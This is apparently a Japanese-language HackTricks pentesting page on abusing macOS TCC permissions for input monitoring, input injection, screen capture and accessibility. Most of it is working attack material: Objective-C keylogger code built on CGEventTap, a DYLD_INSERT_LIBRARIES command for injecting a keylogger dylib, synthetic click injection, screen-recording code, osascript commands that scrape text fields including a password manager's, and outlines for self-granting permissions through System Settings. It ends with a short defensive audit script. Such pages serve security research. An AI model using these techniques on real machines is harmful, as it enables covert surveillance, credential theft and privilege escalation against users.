# macOS Input Monitoring、Screen Capture、Accessibility の悪用

{{#include ../../../banners/hacktricks-training.md}}

## 概要

3つの関連する TCC サービスが、アプリケーションによるユーザーのデスクトップセッションの監視および操作方法を制御します。

| TCC Service | Permission | Capability |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | システム全体のすべてのキーボードおよびマウスイベントを読み取る（keylogging） |
| `kTCCServicePostEvent` | **Input Injection** | 合成キーボードおよびマウスイベントを注入する |
| `kTCCServiceScreenCapture` | **Screen Capture** | display buffer を読み取り、スクリーンショットを取得し、画面を記録する |
| `kTCCServiceAccessibility` | **Accessibility** | AXUIElement API を介して他のアプリケーションを制御し、UI elements を読み取る |

これらの権限は macOS で**最も危険な組み合わせ**です。これらを組み合わせると、以下が可能になります。

- すべてのキー入力の完全な keylogging（パスワード、メッセージ、クレジットカード情報）
- 表示されているすべてのコンテンツの画面 recording
- 合成入力の注入（ボタンのクリック、ダイアログの承認）
- 物理アクセスと同等の完全な GUI 制御

---

## Input Monitoring（kTCCServiceListenEvent）

### 仕組み

macOS は **`CGEventTap` API** を使用して、Quartz event system からの input events をプロセスが intercept できるようにします。ListenEvent permission を持つプロセスは、すべてのキーボードおよびマウスイベントを、対象アプリケーションに到達する前または到達した後に受信する event tap を作成できます。<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Entitlementsを持つバイナリの発見
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Code Injection による Keylogging

ListenEvent permission を持つ binary が **disabled library validation** または **allows DYLD environment variables** も備えている場合、攻撃者は CGEventTap を登録する dylib を inject できます：
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
注入された dylib は対象の ListenEvent TCC grant を継承し、すべてのキーストロークをキャプチャします。

### Attack: Credential Harvesting

高度な keylogger は、キーストロークをアクティブなアプリケーションと関連付けることができます：
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### 仕組み

PostEvent permission により、ListenOnly ではなく **`kCGEventTapOptionDefault`**（イベントを変更・注入可能）を使用して event tap を作成できます。<sup>[[1]](#references)</sup> これにより、以下が可能になります:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### 攻撃: TCC Prompt の自動承認

PostEvent を使用すると、攻撃者は TCC permission dialog の **「Allow」をクリックする操作をシミュレート**できます:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## Screen Capture (kTCCServiceScreenCapture)

### 仕組み

Screen capture の権限により、以下を使用してディスプレイバッファを読み取れます。
- **`CGWindowListCreateImage`** — 任意のウィンドウまたは画面全体をキャプチャ
- **`ScreenCaptureKit`** (macOS 12.3+) — 画面コンテンツをストリーミングする最新のAPI<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — ハードウェアアクセラレーション対応の画面キャプチャ
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Screen Capture Clientの検索
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: OCRによる認証情報の取得

注入されたscreen captureプロセスは、定期的にフレームをキャプチャし、OCRを使用してパスワードを抽出できます：
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> **macOS Sonoma** 以降では、screen capture によりメニューバーに**永続的なインジケーター**が表示されます。古いバージョンでは、screen recording を完全に無音で実行できました。ただし、短時間の単一フレームの capture であれば、ユーザーに気付かれない可能性があります。

### Attack: Session Recording

継続的な screen recording により、ユーザーのセッションを完全に再生できます。
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibility (kTCCServiceAccessibility)

### 仕組み

Accessibility access は、**AXUIElement API** を介して他のアプリケーションを制御できる権限を付与します。<sup>[[2]](#references)</sup> Accessibility access を持つプロセスは、次の操作を実行できます。

1. **読み取り** 任意のアプリケーションのあらゆる UI 要素（テキストフィールド、ラベル、ボタン、メニュー）
2. **クリック** ボタンおよびコントロールを操作
3. **入力** 任意のテキストフィールドへのテキスト入力
4. **移動** メニューおよびダイアログ内を移動
5. **スクレイピング** 実行中の任意のアプリケーションに表示されたデータを取得
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

最も危険な Accessibility の悪用は、**System Settings を操作して、自身の malware に追加の権限を付与すること**です:
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### 攻撃: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attack: 自動化されたユーザーアクション
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## 攻撃チェーン

### 入力監視 + 画面キャプチャ = 完全な監視
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Chain: Accessibility + PostEvent = 完全なリモート操作
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Chain: アクセシビリティ → カメラ/マイクの自己許可 → 監視
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## 検出と列挙
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## 参考資料

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — Accessibility Abuse as TCC Bypass](https://objective-see.org/blog.html)

{{#include ../../../banners/hacktricks-training.md}}
